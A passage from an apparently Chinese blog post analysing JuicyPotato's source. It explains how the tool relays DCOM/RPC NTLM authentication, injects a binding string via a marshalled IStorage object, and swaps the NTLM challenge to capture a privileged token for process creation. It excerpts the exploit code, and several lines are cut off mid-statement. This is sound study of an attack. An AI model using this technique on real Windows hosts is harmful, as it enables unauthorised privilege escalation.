    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));
    bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    listen(ListenSocket, SOMAXCONN);
    select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
    if (FD_ISSET(ListenSocket, &fds))
        ClientSocket = accept(ListenSocket, NULL, NULL);
accept到client后做NTLM认证，常规的循环recv结构
先调用`processNtlmBytes`做本地协商
    iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
    // 处理NTLM type1 ~ type3
    processNtlmBytes(recvbuf, iResult);
`processNtlmBytes`中调用`findNTLMBytes`找到RPC报文中NTLMSPP header的起始偏移（就是一个直白的子串匹配）
然后调用negotiator成员handle NTLM message，后文详细讲
    switch (messageType) {
        case 1:
            //NTLM type 1 message
            negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
            break;
        case 2:
            //NTLM type 2 message
            negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
            break;
        case 3:
            //NTLM type 3 message
            negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
            break;
        default:
            ...
    }
接下来是中继过程，需要将COM service发来的数据中继到RPC端口
连接RPC的socket在`startRPCConnection`操作，两个线程间用了两个send queue通讯，所以这里将对RPC
socket的`send/recv`转化为`push(rpcSendQ)/pop(comSendQ)`
发送后阻塞等待接收RPC响应报文
    rpcSendQ->push((char*)&iResult);
    rpcSendQ->push(recvbuf);
    int* len = (int*)comSendQ->wait_pop();
    sendbuf = comSendQ->wait_pop();
依旧接收到后处理NTLM认证，一般来说这里是type2。处理完后回发给client
    processNtlmBytes(sendbuf, *len);
    iSendResult = send(ClientSocket, sendbuf, *len, 0);
结束一轮循环，这里的细节作者给了注释
    //Sometimes Windows likes to open a new connection instead of using the current one
    //Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
    newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
#### startRPCConnection
开启新线程来连接本机RPC 135PORT
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
这个线程就单纯做了COM service到RPC的中继转发
    rpcSendQ->wait_pop();
    sendbuf = rpcSendQ->wait_pop();
    send(ConnectSocket, sendbuf, *len, 0);
    recv(ConnectSocket, recvbuf, recvbuflen, 0);
#### triggerDCOM & IStorageTrigger
    // 在当前线程初始化COM库，并将并发模型标识为单线程
    CoInitialize(nullptr);
    // 创建复合文件存储对象，该对象实现了IStorage接口
    CreateILockBytesOnHGlobal(NULL, true, &lb);
    StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);
IStorage接口的定义，文件内的层次存储结构，storage相当于directory，stream相当于file
> The **IStorage** interface supports the creation and management of
> structured storage objects. Structured storage allows hierarchical storage
> of information within a single file, and is often referred to as "a file
> system within a file". Elements of a structured storage object are storages
> and streams. Storages are analogous to directories, and streams are
> analogous to files. Within a structured storage there will be a primary
> storage object that may contain substorages, possibly nested, and streams.
> Storages provide the structure of the object, and streams contain the data,
> which is manipulated through the
> [IStream](https://docs.microsoft.com/windows/desktop/api/objidl/nn-objidl-> istream) interface.
>
> The **IStorage** interface provides methods for creating and managing the
> root storage object, child storage objects, and stream objects. These
> methods can create, open, enumerate, move, copy, rename, or delete the
> elements in the storage object.
接着new一个IStorageTrigger对象，该对象把stg包装了一层，实现了IStorage和IMarshal接口
    IStorageTrigger* t = new IStorageTrigger(stg);
重点看`IStorageTrigger::MarshalInterface`，该方法返回序列化后的数据，此处写入RPC绑定字符串，来使COM
Service连接我们COM Server
这一串操作是在把ascii字符串转成UTF16并计算转换后长度，我寻思为啥不用`MultiByteToWideChar`
    unsigned short str_bindlen = ((strlen(ipaddr) + port_len + 2) * 2) + 6;
    unsigned short total_length = (str_bindlen + sec_len) / 2;
    unsigned char sec_offset = str_bindlen / 2;
    port_len = port_len * 2;
    byte *dataip;
    int len = strlen(ipaddr) * 2;
    dataip = (byte *)malloc(len);
    for (int i = 0; i 
`AcquireCredentialsHandle`获取security
principal中预先存在的凭据句柄，`InitializeSecurityContext`和`AcceptSecurityContext`需要此句柄
    AcquireCredentialsHandle(NULL, lpPackageName, SECPKG_CRED_INBOUND, NULL, NULL, 0, NULL, &hCred, &ptsExpiry);
第一次调用`AcceptSecurityContext`，输入NTLM type1，输出NTLM
type2。入参`secClientBufferDesc`，出参`secServerBufferDesc`，保存在`LocalNegotiator`的私有成员
`phContext`为新的security context句柄，有状态，第二次调用需要传递它
第一次调用成功返回值是 **SEC_I_CONTINUE_NEEDED** （The function succeeded. The server must
send the output token to the client and wait for a returned token. The
returned token should be passed in _pInput_ for another call to
[AcceptSecurityContext
(CredSSP)](https://docs.microsoft.com/windows/desktop/api/sspi/nf-sspi-acceptsecuritycontext).）
    InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
    InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);
    secClientBuffer.cbBuffer = static_cast(len);
    secClientBuffer.pvBuffer = ntlmBytes;
    AcceptSecurityContext(
        &hCred,
        nullptr,
        &secClientBufferDesc,
        ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
        //STANDARD_CONTEXT_ATTRIBUTES,
        SECURITY_NATIVE_DREP,
        phContext,
        &secServerBufferDesc,
        &fContextAttr,
        &tsContextExpiry);
#### LocalNegotiator::handleType2
处理RPC发来的NTLM type2，将RPC响应中的NTLM
type2修改为`AcceptSecurityContext`本地协商返回的type2，也就是修改server challenge和reserved
    char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;
    if (len >= secServerBuffer.cbBuffer) {
        for (int i = 0; i negotiator->phContext, &elevated_token);
然后和前文一样调用`CreateProcessASUser/CreateProcessWithToken`创建进程
## Detailed question
通过学习基本掌握了所有细节，只有最后一个细节问题，如果有路过的大佬知道请发email告诉我 : )
JuicyPotato中，通过`CoGetInstanceFromIStorage`函数使rpcss服务激活指定的CLSID的COM服务，rpcss的OXID
resolver会解析序列化的`IStorage`实例并请求OBJREF中指定`host[port]`，由此攻击者可以mitm，这是前提
但按我的理解，传递给`CoGetInstanceFromIStorage`的CLSID参数仅仅是告知rpcss激活哪个COM服务，而OXID
resolve是由rpcss发出的，也就是说最终通过SSPI本地令牌协商拿到的令牌应该是rpcss的，和CLSID无关
但实际情况是，通过指定不同的CLSID，最终令牌权限也不同。比如Windows Server 2008
r2下，这个CLSID最终是当前登录用户的权限`{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`
MSDN的解释也无法获知细节:
> Creates a new object and initializes it from a storage object through an
> internal call to
> [IPersistFile::Load](https://docs.microsoft.com/windows/desktop/api/objidl/nf-> objidl-ipersistfile-load).
那么一个可能的解释是，如果指定BITS的CLSID，该函数先创建BITS对象，然后将`IStorage`参数传递给BITS服务让其自行解析，BITS服务调用rpcss的OXID
resolver去解析OBJREF，rpcss会模拟client（例如调用`RpcImpersonateClient`），最终协商出的令牌权限也就是client的（存疑）
## Ref
  * 
  * 
  * [https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1](https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1)
  * 
  * 